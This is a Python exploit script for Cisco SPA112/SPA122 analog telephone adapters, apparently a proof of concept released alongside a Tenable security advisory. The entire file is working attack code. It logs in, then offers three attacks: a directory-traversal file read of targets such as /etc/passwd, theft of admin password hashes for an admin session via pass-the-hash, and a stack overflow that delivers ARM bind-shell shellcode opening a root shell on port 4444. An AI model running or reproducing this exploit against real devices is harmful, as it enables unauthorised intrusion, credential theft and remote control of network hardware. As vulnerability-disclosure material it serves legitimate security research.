import requests
import sys
import re
import hashlib
import struct
import argparse
import textwrap

# Authors: Andrew Orr, Alex Weber
# See Also: https://www.tenable.com/security/research/tra-2019-44

bind_shellcode = b"\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51" \
                 b"\x37\x01\xdf\x03\x1c\x0f\xa1\x4a\x70\x4a\x60\x10\x22\x01\x37\x01\xdf" \
                 b"\x18\x1c\x02\x21\x02\x37\x01\xdf\x18\x1c\x49\x40\x52\x40\x01\x37\x01" \
                 b"\xdf\x03\x1c\x03\x21\x3f\x27\x18\x1c\x01\x39\x01\xdf\x91\x42\xfa\xd1" \
                 b"\x05\xa0\xc1\x71\xc1\x60\x01\x1c\x08\x31\x80\x60\x0b\x27\x01\xdf\x02" \
                 b"\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58\x01\x01" \
                 b"\x01\x01\x01\x01\x01\x01"

def repeat_to_length(string_to_expand, length):
    return (string_to_expand * (int(length/len(string_to_expand))+1))[:length]

def dumb_password_hash(pwd):
    pwd_with_len = "%s%02d" % (pwd, len(pwd))
    pwd_with_len_repeated = repeat_to_length(pwd_with_len, 64)
    md5 = hashlib.md5()
    md5.update(pwd_with_len_repeated.encode('utf-8'))
    return md5.hexdigest()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
            formatter_class=argparse.RawDescriptionHelpFormatter,
            description='Pwn a Cisco SPA112/SPA122 device.',
            epilog=textwrap.dedent('''\
                examples:
                  $ python3 spagett.py --attack hashes 192.168.3.13 cisco cisco
                  $ python3 spagett.py --attack readfile --file /etc/passwd 192.168.3.13 cisco cisco
                  $ python3 spagett.py --attack shell 192.168.3.13 cisco cisco
                '''))
    parser.add_argument('address', help='Cisco ATA to attack')
    parser.add_argument('--port', help='Web interface port', type=int, default=80)
    parser.add_argument('user', help='web interface user')
    parser.add_argument('password', help='web interface password')
    parser.add_argument('--attack', choices=['hashes', 'readfile', 'shell'], required=True)
    parser.add_argument('--file', required=False)
    args = parser.parse_args()

    base_url = "http://" + args.address + ":" + str(args.port);

    pwd_hash = dumb_password_hash(args.password)
    print("[+] " + args.user + " user password hash is " + pwd_hash)

    r = requests.post(base_url + "/login.cgi", data = {"submit_button":"login", "user":args.user, "pwd":pwd_hash});
    if (r.status_code != requests.codes.ok):
        print("[-] user or pwd incorrect")
        sys.exit(1)
    m = re.search("var session_key='([0-9a-f]+)';", r.text)
    if (m is None):
        print("[-] no session key found")
        sys.exit(1)
    session_key = m.group(1)

    print("[+] logged in, session_key is " + session_key)

    if args.attack == "shell":
        print("[+] searching for httpd using directory traversal")
        for pid in [140, 144, 195, 138, 156, 189, *range(120, 200)]:
            r = requests.post(base_url + "/apply.cgi;session_id=" + session_key,
                              data = {"submit_button": "hax", "submit_type": "hax", "change_action": "gozila_cgi",
                                      "next_page": "/proc/" + str(pid) + "/maps"})
            m = None
            print("[+] trying pid " + str(pid))
            if "httpd" in r.text:
                m = re.search(r"^([a-f0-9]+)-([a-f0-9]+).*\[stack\]$", r.text, flags=re.MULTILINE)
                if m:
                    print("[+] found httpd at pid " + str(pid))
                    break
        if not m:
            print("[-] could not get httpd stack base address")
            sys.exit(1)
        stack_base_hex, _stack_end_hex = m.groups()
        stack_base = int(stack_base_hex, 16)
        print("[+] httpd stack base is " + hex(stack_base))
        buffer_address = stack_base + 53131
        buffer_address = stack_base + 53131 - 16
        payload = (b"z" * 24) + struct.pack("<L", buffer_address + 28 + len("DMZ_Rule_")) + bind_shellcode
        print("[+] sending payload, connect to " + args.address + ":4444 for a shell")
        requests.post(base_url + "/apply.cgi;session_id=" + session_key, data = {"submit_button": "DMZSummary",
                                                                                 "submit_type": "delete",
                                                                                 "change_action": "gozila_cgi",
                                                                                 "remove_id": payload})
        sys.exit(1)
    elif args.attack == 'hashes':
        r = requests.post(base_url + "/apply.cgi;session_id=" + session_key, data = {"submit_button":"User_Level", "change_action":"gozila_cgi"})
        m = re.search('table\[0\]=new AAA\("admin","([0-9a-f]+)","0"\);', r.text)
        if (m is None):
            print("[-] no admin hash found, password might not have been changed, trying default")
            admin_hash = "498836900e3cb4d343b96f3f1c578f4a"
        else:
            admin_hash = m.group(1)
        print("[+] admin hash is " + admin_hash)
        r = requests.post(base_url + "/login.cgi", data = {"submit_button":"login", "user":"admin", "pwd":admin_hash});
        if (r.status_code != requests.codes.ok):
            print("[-] admin user or pwd incorrect")
            sys.exit(1)
        m = re.search("var session_key='([0-9a-f]+)';", r.text)
        if (m is None):
            print("[-] no session key found")
            sys.exit(1)
        admin_session_key = m.group(1)

        print("[+] logged in as admin, session_key is " + admin_session_key)
        print("[+] open this link for admin session:")
        print("[+] " + base_url + "/index.asp;session_id=" + admin_session_key)
        sys.exit(0)
    elif args.attack == "readfile":
        if (args.file is None):
            print("[-] no file arg specified (eg --file /etc/passwd)")
            sys.exit(1)
        print("[+] reading file using directory traversal")
        r = requests.post(base_url + "/apply.cgi;session_id=" + session_key, data = {"submit_button": "hax",
                                                                                     "submit_type": "hax",
                                                                                     "change_action": "gozila_cgi",
                                                                                     "next_page": args.file})
        if (not r.text): 
            print("[-] invalid file path (or empty file?)")
            sys.exit(1)
        print("[+] contents of file " + args.file + ":")
        print(r.text)
        sys.exit(0)
